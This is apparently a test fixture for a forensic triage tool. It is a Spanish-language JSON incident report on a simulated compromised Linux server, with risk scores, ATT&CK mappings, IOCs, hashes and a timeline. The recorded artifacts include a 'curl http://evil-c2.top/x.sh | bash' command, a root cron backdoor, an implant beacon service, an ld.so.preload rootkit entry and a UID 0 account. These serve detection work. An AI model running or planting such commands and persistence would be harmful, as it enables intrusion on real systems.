@@ -1,0 +1,514 @@
+{
+  "case": {
+    "name": "IR-2026/07/15-LPRO-17",
+    "examiner": "C. Villalba",
+    "os": "Linux",
+    "description": "Servidor web expuesto: cuenta backdoor con UID 0, secuestro del enlazador (ld.so.preload) y shell inversa en el historial.",
+    "generated_utc": "2026-07-15T07:04:36Z"
+  },
+  "host": {
+    "hostname": "srv-web-01",
+    "os": "Linux 6.5.0 (Ubuntu 22.04 LTS)",
+    "os_version": "#1 SMP PREEMPT_DYNAMIC @0",
+    "architecture": "x86_64",
+    "python": "3.12.3"
+  },
+  "generated_utc": "2026-07-15T07:04:36Z",
+  "assessment": {
+    "risk_score": 99,
+    "verdict_key": "critico",
+    "verdict": "Compromiso muy probable",
+    "verdict_color": "#F0616D",
+    "verdict_text": "Múltiples indicadores de alta confianza (p. ej. anti-forense, persistencia, credential access). Trata el equipo como comprometido: aíslalo y escala.",
+    "confidence": 93,
+    "confidence_tier": "alta",
+    "reasons": [
+      {
+        "label": "Secuestro del enlazador dinámico (ld.so.preload)",
+        "count": 1,
+        "points": 35,
+        "tactic": "Persistence",
+        "attack": "T1574.006"
+      },
+      {
+        "label": "Cuenta de usuario creada",
+        "count": 2,
+        "points": 30,
+        "tactic": "Persistence",
+        "attack": "T1136"
+      },
+      {
+        "label": "Comando de shell sospechoso (curl|bash, etc.)",
+        "count": 2,
+        "points": 16,
+        "tactic": "Execution",
+        "attack": "T1059.004"
+      },
+      {
+        "label": "Clave SSH añadida (authorized_keys)",
+        "count": 1,
+        "points": 15,
+        "tactic": "Persistence",
+        "attack": "T1098.004"
+      },
+      {
+        "label": "Fuerza bruta / accesos fallidos",
+        "count": 1,
+        "points": 3,
+        "tactic": "Credential Access",
+        "attack": "T1110"
+      }
+    ],
+    "attack_techniques": [
+      {
+        "attack": "T1059.004",
+        "tactic": "Execution",
+        "label": "Comando de shell sospechoso (curl|bash, etc.)",
+        "count": 2
+      },
+      {
+        "attack": "T1098.004",
+        "tactic": "Persistence",
+        "label": "Clave SSH añadida (authorized_keys)",
+        "count": 1
+      },
+      {
+        "attack": "T1136",
+        "tactic": "Persistence",
+        "label": "Cuenta de usuario creada",
+        "count": 2
+      },
+      {
+        "attack": "T1574.006",
+        "tactic": "Persistence",
+        "label": "Secuestro del enlazador dinámico (ld.so.preload)",
+        "count": 1
+      },
+      {
+        "attack": "T1110",
+        "tactic": "Credential Access",
+        "label": "Fuerza bruta / accesos fallidos",
+        "count": 1
+      }
+    ],
+    "signals_triggered": 5
+  },
+  "iocs": [
+    {
+      "type": "ipv4",
+      "value": "91.219.236.14",
+      "defanged": "91[.]219[.]236[.]14",
+      "count": 8,
+      "private": false,
+      "sources": [
+        "logins",
+        "logs",
+        "persistence"
+      ]
+    },
+    {
+      "type": "domain",
+      "value": "evil-c2.top",
+      "defanged": "evil-c2[.]top",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "shell"
+      ]
+    },
+    {
+      "type": "url",
+      "value": "http://evil-c2.top/x.sh",
+      "defanged": "hxxp://evil-c2[.]top/x[.]sh",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "shell"
+      ]
+    }
+  ],
+  "integrity": {
+    "artifacts_total": 9,
+    "artifacts_hashed": 9
+  },
+  "findings": [
+    {
+      "level": "warn",
+      "text": "3 inicio(s) de sesión SSH fallido(s)"
+    },
+    {
+      "level": "warn",
+      "text": "1 acceso(s) SSH directo(s) como root"
+    },
+    {
+      "level": "crit",
+      "text": "1 cuenta(s) extra con UID 0 — escalada/persistencia"
+    },
+    {
+      "level": "crit",
+      "text": "Existe /etc/ld.so.preload — indicador clásico de rootkit"
+    },
+    {
+      "level": "warn",
+      "text": "2 comando(s) sospechoso(s) en el historial (shell inversa, descargas…)"
+    },
+    {
+      "level": "warn",
+      "text": "1 clave(s) SSH en authorized_keys — revisa accesos no autorizados"
+    }
+  ],
+  "chain_of_custody": [
+    {
+      "category": "logins",
+      "source": "/tmp/fakelinux/var/log/wtmp",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/logins/wtmp",
+      "method": "direct",
+      "size": 384,
+      "md5": "5a614a9a9f6b50d93e87d0317af631d1",
+      "sha256": "ded76f202e720f4746284bd0d5342315fa5da697b6c7291a77bf86b378c00be1"
+    },
+    {
+      "category": "logins",
+      "source": "/tmp/fakelinux/var/log/btmp",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/logins/btmp",
+      "method": "direct",
+      "size": 384,
+      "md5": "6cb7e6835588429707cc547811c98ff9",
+      "sha256": "03b63cc1f1f048edc3779b2128acd50b89c27b3689b87dcca2320f6719895a90"
+    },
+    {
+      "category": "logs",
+      "source": "/tmp/fakelinux/var/log/auth.log",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/logs/auth.log",
+      "method": "direct",
+      "size": 504,
+      "md5": "4a1f2a7a945f3f120185f4b49e0dffb7",
+      "sha256": "f3aca7bac423922e6bd66c20f6db2f4f41af18b1150e7d50ec2f40c5ab7a07c2"
+    },
+    {
+      "category": "shell",
+      "source": "/tmp/fakelinux/home/jdoe/.bash_history",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/shell/jdoe_bash_history",
+      "method": "direct",
+      "size": 65,
+      "md5": "fa11bff4a4d7ad7abaf259a0c639a585",
+      "sha256": "bdce132b50bfa57b97e71556ed1d219ec04bf894a8f910949437ce6a68b78c3e"
+    },
+    {
+      "category": "persistence",
+      "source": "/tmp/fakelinux/etc/crontab",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/persistence/crontab",
+      "method": "direct",
+      "size": 45,
+      "md5": "9063e6fadb293f1e4a71570b92e3105c",
+      "sha256": "8d30e233ca2a08f11d66c2b8da9405d3443a01663b92c6005230ba71ecc58e79"
+    },
+    {
+      "category": "persistence",
+      "source": "/tmp/fakelinux/etc/ld.so.preload",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/persistence/ld.so.preload",
+      "method": "direct",
+      "size": 13,
+      "md5": "5993fb808409fc35109ee7d2f75e4ae3",
+      "sha256": "92044be2541f77554ec05425a6f0aa1cd1c46041850c2d25da6870edbf0c4a45"
+    },
+    {
+      "category": "persistence",
+      "source": "/tmp/fakelinux/etc/systemd/system/evil.service",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/persistence/evil.service",
+      "method": "direct",
+      "size": 56,
+      "md5": "6698f3ff5d344a13e27aad380325dfb6",
+      "sha256": "3240baa3773b9e5953660dc4e3960e548d757c7581287004836045d95e0aad2d"
+    },
+    {
+      "category": "persistence",
+      "source": "/tmp/fakelinux/home/jdoe/.ssh/authorized_keys",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/persistence/jdoe_authorized_keys",
+      "method": "direct",
+      "size": 44,
+      "md5": "1af2e5df6d9f324f156903ebbf34c4b6",
+      "sha256": "5b77edcf61010575e000fde868671ac03824d94c121103e6e5ce957b0a9832f3"
+    },
+    {
+      "category": "accounts",
+      "source": "/tmp/fakelinux/etc/passwd",
+      "collected_utc": "2026-07-15T07:04:36Z",
+      "status": "ok",
+      "artifact": "artifacts/accounts/passwd",
+      "method": "direct",
+      "size": 154,
+      "md5": "53c9156d9065910f487a2dd6198c911a",
+      "sha256": "3fd83ab3379d4a3a03f29985751609085141c5139c85cc8da9645a00e1ccdc65"
+    }
+  ],
+  "artifacts": {
+    "logins": [
+      {
+        "timestamp": "2026-07-14T02:00:09Z",
+        "kind": "inicio de sesión",
+        "summary": "root@91.219.236.14",
+        "detail": "tty pts/0",
+        "severity": "info",
+        "user": "root",
+        "host": "91.219.236.14"
+      },
+      {
+        "timestamp": "2026-07-14T02:00:01Z",
+        "kind": "acceso fallido",
+        "summary": "admin@91.219.236.14",
+        "detail": "tty ssh:notty",
+        "severity": "warn",
+        "user": "admin",
+        "host": "91.219.236.14"
+      }
+    ],
+    "logs": [
+      {
+        "timestamp": "2026-07-14T02:02:00Z",
+        "kind": "usuario creado",
+        "summary": "support",
+        "detail": "useradd",
+        "severity": "warn"
+      },
+      {
+        "timestamp": "2026-07-14T02:01:00Z",
+        "kind": "sudo",
+        "summary": "/usr/bin/id",
+        "detail": "por jdoe",
+        "severity": "info"
+      },
+      {
+        "timestamp": "2026-07-14T02:00:09Z",
+        "kind": "SSH correcto",
+        "summary": "root@91.219.236.14",
+        "detail": "vía publickey",
+        "severity": "warn"
+      },
+      {
+        "timestamp": "2026-07-14T02:00:03Z",
+        "kind": "SSH fallido",
+        "summary": "admin@91.219.236.14",
+        "detail": "contraseña incorrecta",
+        "severity": "warn"
+      },
+      {
+        "timestamp": "2026-07-14T02:00:01Z",
+        "kind": "SSH fallido",
+        "summary": "admin@91.219.236.14",
+        "detail": "contraseña incorrecta",
+        "severity": "warn"
+      }
+    ],
+    "journal": [],
+    "shell": [
+      {
+        "timestamp": null,
+        "kind": "comando",
+        "summary": "ls -la",
+        "detail": "jdoe",
+        "severity": "info"
+      },
+      {
+        "timestamp": null,
+        "kind": "comando",
+        "summary": "curl http://evil-c2.top/x.sh | bash",
+        "detail": "jdoe",
+        "severity": "warn"
+      },
+      {
+        "timestamp": null,
+        "kind": "comando",
+        "summary": "chmod +x /tmp/implant",
+        "detail": "jdoe",
+        "severity": "warn"
+      }
+    ],
+    "persistence": [
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "cron/rc",
+        "summary": "* * * * * root /tmp/backdoor.sh",
+        "detail": "crontab",
+        "severity": "info"
+      },
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "servicio systemd",
+        "summary": "/tmp/implant --beacon 91.219.236.14",
+        "detail": "evil.service",
+        "severity": "info"
+      },
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "authorized_key",
+        "summary": "attacker@kali",
+        "detail": "jdoe_authorized_keys",
+        "severity": "warn"
+      },
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "ld.so.preload",
+        "summary": "/tmp/evil.so",
+        "detail": "precarga global de librerías — posible rootkit",
+        "severity": "crit"
+      }
+    ],
+    "accounts": [
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "cuenta UID 0",
+        "summary": "root (uid 0)",
+        "detail": "/bin/bash · /root",
+        "severity": "info"
+      },
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "cuenta con shell",
+        "summary": "jdoe (uid 1000)",
+        "detail": "/bin/bash · /home/jdoe",
+        "severity": "info"
+      },
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "cuenta UID 0",
+        "summary": "support (uid 0)",
+        "detail": "/bin/bash · /root",
+        "severity": "crit"
+      }
+    ],
+    "browsers": []
+  },
+  "parse_errors": [],
+  "timeline_count": 14,
+  "timeline": [
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Persistencia",
+      "type": "cron/rc",
+      "summary": "* * * * * root /tmp/backdoor.sh",
+      "detail": "crontab",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Persistencia",
+      "type": "servicio systemd",
+      "summary": "/tmp/implant --beacon 91.219.236.14",
+      "detail": "evil.service",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Persistencia",
+      "type": "authorized_key",
+      "summary": "attacker@kali",
+      "detail": "jdoe_authorized_keys",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Persistencia",
+      "type": "ld.so.preload",
+      "summary": "/tmp/evil.so",
+      "detail": "precarga global de librerías — posible rootkit",
+      "severity": "crit"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Cuentas",
+      "type": "cuenta UID 0",
+      "summary": "root (uid 0)",
+      "detail": "/bin/bash · /root",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Cuentas",
+      "type": "cuenta con shell",
+      "summary": "jdoe (uid 1000)",
+      "detail": "/bin/bash · /home/jdoe",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Cuentas",
+      "type": "cuenta UID 0",
+      "summary": "support (uid 0)",
+      "detail": "/bin/bash · /root",
+      "severity": "crit"
+    },
+    {
+      "timestamp": "2026-07-14T02:02:00Z",
+      "source": "Logs",
+      "type": "usuario creado",
+      "summary": "support",
+      "detail": "useradd",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:01:00Z",
+      "source": "Logs",
+      "type": "sudo",
+      "summary": "/usr/bin/id",
+      "detail": "por jdoe",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:00:09Z",
+      "source": "Accesos",
+      "type": "inicio de sesión",
+      "summary": "root@91.219.236.14",
+      "detail": "tty pts/0",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:00:09Z",
+      "source": "Logs",
+      "type": "SSH correcto",
+      "summary": "root@91.219.236.14",
+      "detail": "vía publickey",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:00:03Z",
+      "source": "Logs",
+      "type": "SSH fallido",
+      "summary": "admin@91.219.236.14",
+      "detail": "contraseña incorrecta",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:00:01Z",
+      "source": "Accesos",
+      "type": "acceso fallido",
+      "summary": "admin@91.219.236.14",
+      "detail": "tty ssh:notty",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2026-07-14T02:00:01Z",
+      "source": "Logs",
+      "type": "SSH fallido",
+      "summary": "admin@91.219.236.14",
+      "detail": "contraseña incorrecta",
+      "severity": "warn"
+    }
+  ]
+}
